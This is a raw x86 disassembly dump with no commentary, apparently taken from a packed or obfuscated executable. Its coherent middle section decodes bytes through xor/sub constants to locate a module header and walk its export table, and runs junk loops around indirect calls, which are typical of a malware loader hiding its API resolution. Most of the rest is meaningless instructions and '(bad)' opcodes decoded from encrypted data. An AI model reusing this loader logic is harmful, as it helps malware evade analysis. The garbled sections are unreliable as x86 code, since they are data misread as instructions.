  40ca46:	stos   DWORD PTR es:[edi],eax
  40ca47:	repz or DWORD PTR [ebx+0x71],edi
  40ca4b:	adc    eax,0xf79a3400
  40ca50:	dec    esp
  40ca51:	(bad)  
  40ca52:	(bad)  
  40ca53:	push   ss
  40ca54:	sbb    dl,bl
  40ca56:	je     0x40ca74
  40ca58:	call   0xc488:0x9fb22d45
  40ca5f:	cmp    BYTE PTR ds:0x33ff6534,ch
  40ca65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca66:	retf   0xab14
  40ca69:	inc    edx
  40ca6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca6b:	sti    
  40ca6c:	add    ebp,edx
  40ca6e:	xchg   ebp,eax
  40ca6f:	pop    eax
  40ca70:	(bad)  
  40ca71:	sbb    eax,0x5261b3a0
  40ca76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca77:	sbb    eax,DWORD PTR [ecx]
  40ca79:	shl    ah,1
  40ca7b:	adc    esp,DWORD PTR [eax-0x21]
  40ca7e:	in     eax,dx
  40ca7f:	pop    edi
  40ca80:	mov    DWORD PTR [edi+eiz*1],ecx
  40ca83:	sub    bh,BYTE PTR [eax+0x7c]
  40ca86:	jmp    0xb6bd:0xac8ee12c
  40ca8d:	loop   0x40cb00
  40ca8f:	inc    edi
  40ca90:	shl    DWORD PTR [ecx],cl
  40ca92:	mov    esp,DWORD PTR [ebx]
  40ca94:	outs   dx,BYTE PTR ds:[esi]
  40ca95:	sbb    BYTE PTR [edx-0x3ad09011],dl
  40ca9b:	and    DWORD PTR [ebx+0x17],edx
  40ca9e:	add    BYTE PTR [edx+0x39],al
  40caa1:	push   es
  40caa2:	push   edx
  40caa3:	push   0x1126b714
  40caa8:	ja     0x40ca70
  40caaa:	out    dx,al
  40caab:	fst    DWORD PTR ds:0x8b1801c1
  40cab1:	inc    ebp
  40cab2:	cld    
  40cab3:	mov    edi,DWORD PTR [ebp-0x8]
  40cab6:	add    edi,DWORD PTR [eax]
  40cab8:	mov    DWORD PTR [ebp-0x8],edi
  40cabb:	mov    eax,DWORD PTR [ebp+0xc]
  40cabe:	mov    edi,DWORD PTR [ebp+0xc]
  40cac1:	xor    edi,ecx
  40cac3:	xor    eax,ecx
  40cac5:	lea    eax,[eax+edi*1+0x64e5ba]
  40cacc:	mov    edi,DWORD PTR [ebp+0xc]
  40cacf:	xor    edi,ecx
  40cad1:	add    edi,edx
  40cad3:	imul   eax,edi
  40cad6:	mov    edi,DWORD PTR [ebp+0xc]
  40cad9:	xor    edi,ecx
  40cadb:	sub    edi,eax
  40cadd:	mov    eax,DWORD PTR [ebp-0x4]
  40cae0:	add    edi,edx
  40cae2:	cmp    DWORD PTR [eax],edi
  40cae4:	mov    eax,DWORD PTR [ebp-0x4]
  40cae7:	mov    edi,DWORD PTR [ebp+0x10]
  40caea:	jg     0x40cafd
  40caf0:	xor    edi,ecx
  40caf2:	mov    ebx,esi
  40caf4:	sub    ebx,edi
  40caf6:	add    DWORD PTR [eax],ebx
  40caf8:	jmp    0x40cb03
  40cafd:	xor    edi,ecx
  40caff:	add    edi,edx
  40cb01:	add    DWORD PTR [eax],edi
  40cb03:	mov    eax,DWORD PTR [ebp-0x8]
  40cb06:	mov    edi,DWORD PTR [ebp-0x10]
  40cb09:	mov    eax,DWORD PTR [eax]
  40cb0b:	xor    edi,ecx
  40cb0d:	add    edi,0x3272dc
  40cb13:	not    edi
  40cb15:	and    eax,edi
  40cb17:	movsx  di,BYTE PTR [eax+0x1]
  40cb1c:	mov    ebx,0x3b4c
  40cb21:	sub    di,bx
  40cb24:	mov    ebx,0x8a89
  40cb29:	xor    di,bx
  40cb2c:	mov    ebx,0x4f87
  40cb31:	cmp    di,bx
  40cb34:	jne    0x40cb5c
  40cb3a:	movsx  di,BYTE PTR [eax]
  40cb3e:	mov    ebx,0x3b4c
  40cb43:	sub    di,bx
  40cb46:	mov    ebx,0x8a89
  40cb4b:	xor    di,bx
  40cb4e:	mov    ebx,0x4f88
  40cb53:	cmp    di,bx
  40cb56:	je     0x40cb6c
  40cb5c:	mov    edi,DWORD PTR [ebp-0x10]
  40cb5f:	xor    edi,ecx
  40cb61:	mov    ebx,esi
  40cb63:	sub    ebx,edi
  40cb65:	add    eax,ebx
  40cb67:	jmp    0x40cb17
  40cb6c:	mov    esi,DWORD PTR [ebp-0x14]
  40cb6f:	mov    esi,DWORD PTR [esi]
  40cb71:	mov    edi,DWORD PTR [eax+0x3c]
  40cb74:	lea    esi,[edi+esi*8+0x78]
  40cb78:	mov    esi,DWORD PTR [esi+eax*1]
  40cb7b:	mov    DWORD PTR [ebp-0x8],esi
  40cb7e:	mov    esi,DWORD PTR [ebp+0x8]
  40cb81:	xor    esi,ecx
  40cb83:	add    esi,edx
  40cb85:	mov    DWORD PTR [ebp-0x14],esi
  40cb88:	mov    esi,DWORD PTR [ebp+0x8]
  40cb8b:	mov    edi,DWORD PTR [ebp-0x8]
  40cb8e:	xor    esi,ecx
  40cb90:	add    esi,edx
  40cb92:	pop    ebx
  40cb93:	cmp    edi,esi
  40cb95:	jne    0x40cbb3
  40cb9b:	mov    eax,DWORD PTR [ebp+0xc]
  40cb9e:	xor    eax,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cba3:	add    eax,edx
  40cba5:	imul   eax,ecx
  40cba8:	mov    DWORD PTR [ebp-0x8],eax
  40cbab:	push   DWORD PTR [ebp+0x18]
  40cbae:	jmp    0x40cc07
  40cbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbb6:	add    ecx,eax
  40cbb8:	mov    DWORD PTR [ebp-0x14],ecx
  40cbbb:	mov    ecx,DWORD PTR [ebp-0x14]
  40cbbe:	mov    ecx,DWORD PTR [ecx+0xc]
  40cbc1:	movsx  cx,BYTE PTR [ecx+eax*1]
  40cbc6:	mov    edx,0x3b4c
  40cbcb:	sub    cx,dx
  40cbce:	mov    edx,0x8a89
  40cbd3:	xor    cx,dx
  40cbd6:	mov    edx,0x4e76
  40cbdb:	cmp    cx,dx
  40cbde:	jne    0x40cbab
  40cbe4:	mov    ecx,DWORD PTR ds:0x42e435
  40cbea:	mov    ecx,DWORD PTR [ecx+0x198]
  40cbf0:	mov    DWORD PTR [ecx],eax
  40cbf2:	jmp    0x40cc18
  40cbf7:	mov    ecx,DWORD PTR [ebp+0x18]
  40cbfa:	cmp    ecx,0xf89c85b2
  40cc00:	jne    0x40cc18
  40cc06:	push   eax
  40cc07:	push   DWORD PTR [ebp+0x14]
  40cc0a:	push   DWORD PTR [ebp+0x10]
  40cc0d:	push   DWORD PTR [ebp+0xc]
  40cc10:	push   DWORD PTR [ebp+0x8]
  40cc13:	call   0x40a327
  40cc18:	pop    edi
  40cc19:	pop    esi
  40cc1a:	leave  
  40cc1b:	ret    0x14
  40cc1e:	push   ebp
  40cc1f:	mov    ebp,esp
  40cc21:	push   ecx
  40cc22:	push   ecx
  40cc23:	add    DWORD PTR ds:0x42b010,edx
  40cc29:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  40cc30:	sub    DWORD PTR ds:0x429024,0x76a8
  40cc3a:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  40cc41:	and    DWORD PTR ds:0x42b018,edi
  40cc47:	mov    eax,DWORD PTR [ebp-0x4]
  40cc4a:	adc    DWORD PTR ds:0x429018,edx
  40cc50:	push   esi
  40cc51:	and    DWORD PTR ds:0x42a000,0x0
  40cc5b:	jmp    0x40cc6d
  40cc60:	mov    esi,DWORD PTR ds:0x42a000
  40cc66:	inc    esi
  40cc67:	mov    DWORD PTR ds:0x42a000,esi
  40cc6d:	cmp    DWORD PTR ds:0x42a000,0x1a
  40cc74:	jae    0x40cc98
  40cc7a:	cmp    DWORD PTR ds:0x42a000,0x26
  40cc81:	jne    0x40cc8d
  40cc87:	call   DWORD PTR ds:0x42ed51
  40cc8d:	jmp    0x40cc60
  40cc92:	sub    edx,0x54cb
  40cc98:	mov    esi,DWORD PTR [ebp-0x8]
  40cc9b:	and    DWORD PTR ds:0x429018,0x0
  40cca5:	jmp    0x40ccb7
  40ccaa:	mov    ecx,DWORD PTR ds:0x429018
  40ccb0:	inc    ecx
  40ccb1:	mov    DWORD PTR ds:0x429018,ecx
  40ccb7:	cmp    DWORD PTR ds:0x429018,0x1e
  40ccbe:	jae    0x40ccf6
  40ccc4:	cmp    DWORD PTR ds:0x429018,0x8
  40cccb:	jne    0x40ccd7
  40ccd1:	call   DWORD PTR ds:0x42ed55
  40ccd7:	cmp    DWORD PTR ds:0x429018,0x7
  40ccde:	jne    0x40ccf1
  40cce4:	mov    ecx,DWORD PTR ds:0x429018
  40ccea:	inc    ecx
  40cceb:	mov    DWORD PTR ds:0x429018,ecx
  40ccf1:	jmp    0x40ccaa
  40ccf6:	mov    edx,0x7510896
  40ccfb:	mov    ecx,DWORD PTR ds:0x42d00c
  40cd01:	sub    DWORD PTR ds:0x42a004,ecx
  40cd07:	xor    eax,edx
  40cd09:	xor    esi,edx
  40cd0b:	mov    DWORD PTR ds:0x42b00c,0x13
  40cd15:	cmp    DWORD PTR ds:0x42b00c,0x0
  40cd1c:	je     0x40cd7c
  40cd22:	cmp    DWORD PTR ds:0x42b00c,0x2
  40cd29:	jne    0x40cd50
  40cd2f:	push   DWORD PTR [ebp-0x14]
  40cd32:	push   0x6af7
  40cd37:	push   0x42b010
  40cd3c:	push   0x84d2
  40cd41:	push   DWORD PTR [ebp-0x10]
  40cd44:	push   DWORD PTR [ebp-0x20]
  40cd47:	push   DWORD PTR [ebp-0x28]
  40cd4a:	call   DWORD PTR ds:0x42ed59
  40cd50:	cmp    DWORD PTR ds:0x42b00c,0x3
  40cd57:	jne    0x40cd6a
  40cd5d:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd63:	dec    ecx
  40cd64:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd6a:	mov    ecx,DWORD PTR ds:0x42b00c
  40cd70:	dec    ecx
  40cd71:	mov    DWORD PTR ds:0x42b00c,ecx
  40cd77:	jmp    0x40cd15
  40cd7c:	mov    ecx,0x3272dd
  40cd81:	add    esi,ecx
  40cd83:	add    eax,ecx
  40cd85:	imul   eax,esi
  40cd88:	mov    esi,DWORD PTR [ebp+0xc]
  40cd8b:	cmp    esi,eax
  40cd8d:	jne    0x40cda9
  40cd93:	mov    eax,DWORD PTR [ebp-0x4]
  40cd96:	mov    esi,DWORD PTR [ebp-0x8]
  40cd99:	xor    eax,edx
  40cd9b:	xor    esi,edx
  40cd9d:	add    eax,ecx
  40cd9f:	add    esi,ecx
  40cda1:	imul   eax,esi
  40cda4:	jmp    0x40f15e
  40cda9:	mov    eax,DWORD PTR [ebp+0xc]
  40cdac:	mov    eax,DWORD PTR [eax+0x78]
  40cdaf:	mov    DWORD PTR [ebp+0xc],eax
  40cdb2:	mov    eax,DWORD PTR [ebp-0x4]
  40cdb5:	mov    esi,DWORD PTR [ebp-0x8]
  40cdb8:	xor    eax,edx
  40cdba:	xor    esi,edx
  40cdbc:	add    eax,ecx
  40cdbe:	add    esi,ecx
  40cdc0:	imul   eax,esi
  40cdc3:	jmp    0x40f13d
  40cdc8:	push   esi
  40cdc9:	pop    ss
  40cdca:	rcl    DWORD PTR [ebx-0x6d],cl
  40cdcd:	fwait
  40cdce:	(bad)  
  40cdcf:	pop    ss
  40cdd0:	push   ds
  40cdd1:	outs   dx,BYTE PTR ds:[esi]
  40cdd2:	adc    DWORD PTR ds:0xaef818bd,ebx
  40cdd8:	fldl2t 
  40cdda:	jp     0x40ce56
  40cddc:	sbb    DWORD PTR [edi+0x7a],ebx
  40cddf:	jp     0x40cdf7
  40cde1:	sbb    al,0xaf
  40cde3:	jnp    0x40cd6b
  40cde5:	enter  0xc551,0x14
  40cde9:	lock or eax,0x698f9c9b
  40cdef:	jle    0x40ce3c
  40cdf1:	mov    al,0x50
  40cdf3:	push   ds
  40cdf4:	neg    BYTE PTR [eax+0x517de707]
  40cdfa:	mov    edx,cs
  40cdfc:	f2xm1  
  40cdfe:	loope  0x40ce27
  40ce00:	dec    eax
  40ce01:	pop    edx
  40ce02:	jmp    0x6a487b13
  40ce07:	jns    0x40ce4f
  40ce09:	div    BYTE PTR [esi]
  40ce0b:	bound  edx,QWORD PTR ds:0x3747b093
  40ce11:	inc    ebx
  40ce12:	mov    al,0x2e
  40ce14:	inc    edx
  40ce15:	into   
  40ce16:	cmp    DWORD PTR [ebp+edi*8-0x1e62811f],ebp
  40ce1d:	(bad)  
  40ce1e:	and    bh,BYTE PTR [esi-0x4c60e54e]
  40ce24:	popf   
  40ce25:	mov    edx,0x82856118
  40ce2a:	sbb    esp,edi
  40ce2c:	outs   dx,DWORD PTR ds:[esi]
  40ce2d:	jae    0x40cdc8
  40ce2f:	xchg   edi,eax
  40ce30:	pop    ds
  40ce31:	cwde   
  40ce32:	xchg   ecx,eax
  40ce33:	push   ds
  40ce34:	clc    
  40ce35:	dec    BYTE PTR [edi-0x79]
  40ce38:	jmp    0xa22ba457
  40ce3d:	mov    DWORD PTR [ecx-0x152ec7df],edx
  40ce43:	pop    ecx
  40ce44:	adc    eax,0xdf84fbea
  40ce49:	imul   esi,DWORD PTR [edx-0x1eb1d8ba],0x1484eec0
  40ce53:	xor    eax,0x66c3bea8
  40ce58:	push   0xf9ff459a
  40ce5d:	add    eax,0xe781dc97
  40ce62:	scas   al,BYTE PTR es:[edi]
  40ce63:	cmc    
  40ce64:	stc    
  40ce65:	dec    esi
  40ce66:	pop    ebx
  40ce67:	neg    esi
  40ce69:	fs jge 0x40ce8e
  40ce6c:	gs xor al,0x10
  40ce6f:	lock imul BYTE PTR [esi+0x5e41d727]
  40ce76:	mov    BYTE PTR ds:0xc5179ee6,bl
  40ce7c:	xchg   ecx,eax
  40ce7d:	dec    edx
  40ce7e:	mov    edi,0x1109d319
  40ce83:	pop    ebx
  40ce84:	pop    eax
  40ce85:	popf   
  40ce86:	adc    esi,ebp
  40ce88:	sbb    cl,BYTE PTR [edi-0xc]
  40ce8b:	pop    edi
  40ce8c:	sub    DWORD PTR [ebx-0x4f],esp
  40ce8f:	xor    BYTE PTR [esi+0x3f2d04e0],cl
  40ce95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce96:	mov    bh,0x91
  40ce98:	add    BYTE PTR [ecx+0x14],0x32
  40ce9c:	jge    0x40ce8d
  40ce9e:	clc    
  40ce9f:	mov    ecx,0x379d3ada
  40cea4:	cmp    al,0x7e
  40cea6:	xor    eax,0xa1e0f1ea
  40ceab:	cli    
  40ceac:	dec    esp
  40cead:	lea    edi,[ebx+0xbfb5b5d]
  40ceb3:	xor    DWORD PTR [eax],eax
  40ceb5:	call   0x65d83469
  40ceba:	aas    
  40cebb:	fcomp  QWORD PTR [ebx]
  40cebd:	loopne 0x40cf01
  40cebf:	push   edi
  40cec0:	fld    QWORD PTR [edi+0x7e]
  40cec3:	ror    BYTE PTR [edx],1
  40cec5:	int3   
  40cec6:	setbe  BYTE PTR [ebp+eiz*8+0x42]
  40cecb:	adc    al,0x43
  40cecd:	pop    ss
  40cece:	es pop esi
  40ced0:	add    al,0x62
  40ced2:	mov    eax,0x8e377f8f
  40ced7:	push   ecx
  40ced8:	fisubr WORD PTR [edx]
  40ceda:	inc    ecx
  40cedb:	add    al,0xf7
  40cedd:	pusha  
  40cede:	js     0x40ce91
  40cee0:	mov    al,ds:0x2305a7c6
  40cee5:	fist   DWORD PTR [edi+ecx*4+0x4fd6216]
  40ceec:	dec    esp
  40ceed:	repz (bad) 
  40ceef:	fnstsw WORD PTR [ebx-0x6b]
  40cef2:	jp     0x40ce86
  40cef4:	inc    eax
  40cef5:	loop   0x40ced7
  40cef7:	cwde   
  40cef8:	mov    eax,ds:0xc484a384
  40cefd:	dec    ecx
  40cefe:	push   ds
  40ceff:	bnd jmp 0xf0a9f4d7
  40cf05:	xor    al,0x1b
  40cf07:	fnsave [ebp-0x5e]
  40cf0a:	cmp    BYTE PTR [eax-0x6fdebd9d],bh
  40cf10:	hlt    
  40cf11:	dec    ebx
  40cf12:	nop
  40cf13:	cs mov esi,0x895a8820
  40cf19:	sub    BYTE PTR [eax+esi*2+0x1c15bb0d],dh
  40cf20:	pop    edx
  40cf21:	test   DWORD PTR [esp+eiz*4-0x5c],esp
  40cf25:	out    dx,al
  40cf26:	(bad)  
  40cf28:	and    al,0xaa
  40cf2a:	push   ebx
  40cf2b:	inc    esp
  40cf2c:	test   BYTE PTR [ebx+0x159e2874],ch
  40cf32:	adc    al,0xc4
  40cf34:	adc    dh,cl
  40cf36:	jl     0x40cf14
  40cf38:	mov    WORD PTR [esi+0x2f],gs
  40cf3b:	sbb    al,0xa9
  40cf3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf3e:	not    BYTE PTR [ebx]
  40cf40:	jle    0x40cf04
  40cf42:	inc    ebx
  40cf43:	jb     0x40cecc
  40cf45:	out    dx,al
  40cf46:	mov    dl,0x8
  40cf48:	mov    bh,0xbf
  40cf4a:	push   ss
  40cf4b:	pop    esi
  40cf4c:	sar    edi,1
  40cf4e:	shl    dh,1
  40cf50:	aam    0xe3
  40cf52:	repz dec edi
  40cf54:	push   edx
  40cf55:	bound  edi,QWORD PTR [esp+edi*8]
  40cf58:	cmp    DWORD PTR [ebx-0x28b31ad],edx
  40cf5e:	imul   ecx,DWORD PTR [esi-0x64e746d5],0x32
  40cf65:	dec    eax
  40cf66:	mov    ds:0x2fd24697,eax
  40cf6b:	xchg   ebx,esp
  40cf6d:	out    dx,al
  40cf6e:	in     al,dx
  40cf6f:	fdivr  QWORD PTR [esi]
  40cf71:	xchg   esp,eax
  40cf72:	sar    BYTE PTR [ebp-0x65],cl
  40cf75:	data16 hlt 
  40cf77:	mov    ecx,0xce67c0cf
  40cf7c:	jp     0x40cff2
  40cf7e:	cmp    eax,0x222ea1a6
  40cf83:	fsubr  DWORD PTR [edi-0x463d5aee]
  40cf89:	repnz add BYTE PTR [ebp+0x5edd207b],bl
  40cf90:	je     0x40cf41
  40cf92:	inc    esp
  40cf93:	leave  
  40cf94:	push   ecx
  40cf95:	stc    
  40cf96:	into   
  40cf97:	push   esp
  40cf98:	pop    edi
  40cf99:	xchg   edx,eax
  40cf9a:	test   DWORD PTR [ecx+0x2186b321],0x7de9a615
  40cfa4:	xchg   edi,eax
  40cfa5:	xor    eax,0x20a7e10a
  40cfaa:	pop    es
  40cfab:	nop
  40cfac:	jns    0x40cf53
  40cfae:	mul    bh
  40cfb0:	sti    
  40cfb1:	(bad)  
  40cfb2:	les    ebp,FWORD PTR [edi+0x6b]
  40cfb5:	dec    eax
  40cfb6:	out    0xe0,al
  40cfb8:	ja     0x40d014
  40cfba:	sar    BYTE PTR [ecx-0x63],cl
  40cfbd:	mov    al,0xf2
  40cfbf:	(bad)  
  40cfc0:	push   ss
  40cfc1:	repz arpl bx,bx
  40cfc4:	lock scas al,BYTE PTR es:[edi]
  40cfc6:	sub    BYTE PTR [ebx],0xa0
  40cfc9:	leave  
  40cfca:	aas    
  40cfcb:	dec    eax
  40cfcc:	xchg   ecx,eax
  40cfcd:	adc    ebx,edx
  40cfcf:	pop    esi
  40cfd0:	fucomi st,st(4)
  40cfd2:	inc    edi
  40cfd3:	or     al,ch
  40cfd5:	mov    ecx,0x71d1c392
  40cfda:	sub    esi,DWORD PTR [ecx+0x78afd5c9]
  40cfe0:	inc    edx
  40cfe1:	mov    dh,0xe9
  40cfe3:	inc    esp
  40cfe4:	sbb    esp,DWORD PTR [ebx]
  40cfe6:	mov    edx,0x3af25c7
  40cfeb:	ds jecxz 0x40d01f
  40cfee:	pop    ebx
  40cfef:	(bad)  
  40cff0:	pop    eax
  40cff1:	jecxz  0x40cfd5
  40cff3:	inc    edi
  40cff4:	mov    bh,0xf9
  40cff6:	inc    ebp
  40cff7:	retf   0x5481
  40cffa:	pushf  
  40cffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cffc:	sbb    ah,BYTE PTR fs:[esp+edi*2+0x5f]
  40d001:	mov    al,ds:0x36af5956
  40d006:	mov    ds:0x5c16fcaf,eax
  40d00b:	pop    esp
  40d00c:	lock sub eax,0x3578e080
  40d012:	stc    
  40d013:	push   cs
  40d014:	test   ecx,edx
  40d016:	pop    es
  40d017:	cmp    al,0xa0
  40d019:	dec    edx
  40d01a:	stos   DWORD PTR es:[edi],eax
  40d01b:	xchg   edx,eax
  40d01c:	jp     0x40d02e
  40d01e:	cmp    al,0x77
  40d020:	pop    ecx
  40d021:	lods   al,BYTE PTR ds:[esi]
  40d022:	pop    ecx
  40d023:	pop    esi
  40d024:	cmp    dl,BYTE PTR [edx+0xa]
  40d027:	push   esp
  40d028:	iret   
  40d029:	retf   0xd6e8
  40d02c:	push   ss
  40d02d:	idiv   BYTE PTR [ebp-0x14af1ca5]
  40d033:	mov    esi,0x754f45e1
  40d038:	out    dx,al
  40d039:	ja     0x40d02c
  40d03b:	mov    ch,0x16
  40d03d:	in     eax,dx
  40d03e:	jnp    0x40d06a
  40d040:	mov    bh,0xed
  40d042:	pop    edi
  40d044:	je     0x40d04b
  40d046:	ja     0x40d00c
  40d048:	xor    edx,0x6245aa2a
  40d04e:	repnz pop edx
  40d050:	and    ah,dh
  40d052:	jbe    0x40d0ba
  40d054:	lods   al,BYTE PTR ds:[esi]
  40d055:	push   es
  40d056:	dec    eax
  40d057:	cmp    eax,DWORD PTR [ebp-0x27]
  40d05a:	adc    ecx,DWORD PTR [esi+0x47]
  40d05d:	fiadd  DWORD PTR [ecx-0x7e6109c3]
  40d063:	jmp    0x6f16:0xbb566faa
  40d06a:	jns    0x40d0e3
  40d06c:	xchg   edi,eax
  40d06d:	sbb    al,0x57
  40d06f:	jmp    0xf87d1d72
  40d074:	out    0xb9,eax
  40d076:	out    0x70,eax
  40d078:	pop    edi
  40d079:	icebp  
  40d07a:	adc    esp,DWORD PTR [ebx+0x3d]
  40d07d:	add    BYTE PTR [ecx+0x6e76a823],0xef
  40d084:	fld    TBYTE PTR cs:[ecx]
  40d087:	or     al,0x58
  40d089:	jo     0x40d100
  40d08b:	mov    bh,0xcd
  40d08d:	leave  
  40d08e:	cmp    BYTE PTR [esi+edx*4],bl
  40d091:	sub    dh,BYTE PTR [esi+0x38]
  40d094:	ins    BYTE PTR es:[edi],dx
  40d095:	add    BYTE PTR ds:0xecf95abc,0x8
  40d09c:	in     eax,0x2f
  40d09e:	(bad)  
  40d09f:	cmc    
  40d0a0:	pop    ecx
  40d0a1:	les    esi,FWORD PTR [eax]
  40d0a3:	lds    esp,FWORD PTR [esi-0x39ce20e]
  40d0a9:	pop    ss
  40d0aa:	mov    BYTE PTR ss:[eax+esi*8],ch
  40d0ae:	xor    ecx,ebp
  40d0b0:	loop   0x40d059
  40d0b2:	test   cl,ch
  40d0b4:	aam    0x72
  40d0b6:	and    ebp,DWORD PTR [esi+0x1c425cc7]
  40d0bc:	cmp    DWORD PTR [eax+edi*1],esp
  40d0bf:	sub    DWORD PTR [eax-0x7424ecee],ebp
  40d0c5:	mov    ebp,0x1b661a13
  40d0ca:	mov    bh,0x71
  40d0cc:	fdiv   QWORD PTR ds:0xc5d6ade7
  40d0d2:	cwde   
  40d0d3:	xor    DWORD PTR [esi+0x7abbf9d0],0xad1d9d87
  40d0dd:	(bad)  
  40d0de:	out    dx,eax
  40d0df:	das    
  40d0e0:	jae    0x40d0fc
  40d0e2:	xor    eax,DWORD PTR [esi+0x2c3e3111]
  40d0e8:	mov    edx,DWORD PTR [edx+eax*2+0x37]
  40d0ec:	xchg   ebx,eax
  40d0ed:	ins    DWORD PTR es:[edi],dx
  40d0ee:	mov    edx,0x8d40e8f6
  40d0f3:	pop    ebp
  40d0f4:	bswap  ecx
  40d0f6:	jmp    0x40d111
  40d0f8:	xchg   esp,eax
  40d0f9:	and    al,0x7d
  40d0fb:	cmovp  ebx,eax
  40d0fe:	clc    
  40d0ff:	inc    eax
  40d100:	out    0x6,al
  40d102:	test   eax,0xd808724a
  40d107:	or     DWORD PTR [ebx-0x7e9f6b24],ecx
  40d10d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d10e:	popa   
  40d10f:	push   es
  40d110:	fnstsw WORD PTR [ebx-0x56dabde0]
  40d116:	or     BYTE PTR [esi],bh
  40d118:	inc    ecx
  40d119:	mov    al,BYTE PTR [edx+0x48]
  40d11c:	add    edx,DWORD PTR [ecx]
  40d11e:	out    0xef,eax
  40d120:	idiv   DWORD PTR [edi-0x2df3f7c1]
  40d126:	dec    esp
  40d127:	out    0x44,al
  40d129:	shl    DWORD PTR [ebp-0x23],0x8f
  40d12d:	push   0x4d
  40d12f:	push   ecx
  40d130:	xlat   BYTE PTR ds:[ebx]
  40d131:	jl     0x40d0e2
  40d133:	call   0x8fd7:0x84627126
  40d13a:	repz cmp al,0xf0
  40d13d:	inc    esp
  40d13e:	repz fist DWORD PTR ss:[edi-0x3e55eb2c]
  40d146:	dec    esi
  40d147:	pop    esi
  40d148:	test   DWORD PTR [eax-0x3f],ebx
  40d14b:	stos   BYTE PTR es:[edi],al
  40d14c:	jge    0x40d1b5
  40d14e:	movaps XMMWORD PTR [eax-0x35],xmm5
  40d152:	int3   
  40d153:	rcr    BYTE PTR [ebx+ebx*4+0x7d63b97d],1
  40d15a:	sbb    dh,BYTE PTR [esi]
  40d15c:	in     al,dx
  40d15d:	add    BYTE PTR [edi+ebx*4-0x2c],0xc1
  40d162:	(bad)  
  40d163:	(bad)  
  40d164:	aam    0xf
  40d166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d167:	dec    esp
  40d168:	nop
  40d169:	dec    ebx
  40d16a:	ja     0x40d0fb
  40d16c:	add    DWORD PTR [ebx],esp
  40d16e:	shr    DWORD PTR ds:0xe7a4db0d,cl
  40d174:	jg     0x40d19e
  40d176:	je     0x40d139
  40d178:	inc    edi
  40d179:	or     al,0x3f
  40d17b:	xchg   ebp,eax
  40d17c:	fist   WORD PTR [ecx]
  40d17e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d17f:	mov    cl,0xfd
  40d181:	adc    ah,BYTE PTR [eax-0x7530f3b]
  40d187:	loop   0x40d140
  40d189:	or     DWORD PTR [esi+0x6a],edx
  40d18c:	into   
  40d18d:	int    0xc8
  40d18f:	add    bl,cl
  40d191:	adc    al,0x11
  40d193:	loopne 0x40d1c2
  40d195:	enter  0x7bd4,0x90
  40d199:	mov    DWORD PTR [edi-0x36020921],ebx
  40d19f:	jbe    0x40d1e9
  40d1a1:	jmp    0x40d1b4
  40d1a3:	imul   eax,esp,0xf43a3b2d
  40d1a9:	mov    DWORD PTR [ebp+0x11048ca6],ebp
  40d1af:	xor    al,0x21
  40d1b1:	in     eax,0x23
  40d1b3:	adc    al,0x45
  40d1b5:	xor    al,BYTE PTR [esi+eiz*4]
  40d1b8:	cmp    al,0x75
  40d1ba:	rol    ch,cl
  40d1bc:	pop    esi
  40d1bd:	dec    esp
  40d1be:	mov    DWORD PTR [ebx],eax
  40d1c0:	cmc    
  40d1c1:	adc    ecx,edi
  40d1c3:	stos   DWORD PTR es:[edi],eax
  40d1c4:	pop    esp
  40d1c5:	cld    
  40d1c6:	lahf   
  40d1c7:	or     DWORD PTR [edx-0x44],ebp
  40d1ca:	adc    cl,BYTE PTR [edi-0x58]
  40d1cd:	ja     0x40d170
  40d1cf:	icebp  
  40d1d0:	push   0x47
  40d1d2:	mov    ds:0x777f7bf3,eax
  40d1d7:	sahf   
  40d1d8:	ret    
  40d1d9:	lock shr DWORD PTR [esi],1
  40d1dc:	sbb    esp,ebp
  40d1de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1df:	popa   
  40d1e0:	jo     0x40d202
  40d1e2:	ret    
  40d1e3:	stos   DWORD PTR es:[edi],eax
  40d1e4:	mov    bh,0xde
  40d1e6:	repnz mov WORD PTR [ebp+ecx*2+0x6d],gs
  40d1eb:	(bad)  
  40d1ec:	push   0xde56cc45
  40d1f1:	out    0x19,al
  40d1f3:	cmp    eax,0x5b5ee295
  40d1f8:	pusha  
  40d1f9:	xchg   edi,eax
  40d1fa:	push   ebp
  40d1fb:	repnz and ah,BYTE PTR [ebx-0xbf1c22a]
  40d202:	iret   
  40d203:	out    dx,eax
  40d204:	mov    ds:0xeb649ed9,al
  40d209:	dec    ebp
  40d20a:	scas   eax,DWORD PTR es:[edi]
  40d20b:	in     al,0xc3
  40d20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d20e:	mov    al,ds:0x8aad84af
  40d213:	inc    edx
  40d214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d215:	xchg   bl,dh
  40d217:	dec    esi
  40d218:	mov    al,ds:0x1af3a0fd
  40d21d:	pusha  
  40d21e:	and    ecx,DWORD PTR [edi-0x71ce1fd0]
  40d224:	inc    eax
  40d225:	push   0x9b3128a7
  40d22a:	inc    eax
  40d22b:	or     ebp,DWORD PTR [ebx-0x4a]
  40d22e:	je     0x40d2a3
  40d230:	gs xchg esp,eax
  40d232:	ds push ss
  40d234:	mov    dh,0x8f
  40d236:	cmp    edx,DWORD PTR ds:0xef33c016
  40d23c:	ret    0x5af4
  40d23f:	imul   esp,ebx,0x74
  40d242:	popa   
  40d243:	inc    ebp
  40d244:	cmp    edx,ecx
  40d246:	push   esp
  40d247:	mov    al,ds:0x6925220c
  40d24c:	jne    0x40d23a
  40d24e:	xor    ah,BYTE PTR [ecx+eax*1-0x29]
  40d252:	pop    ecx
  40d253:	outs   dx,DWORD PTR ds:[esi]
  40d254:	cli    
  40d255:	jmp    0x75f4:0x553c3a0b
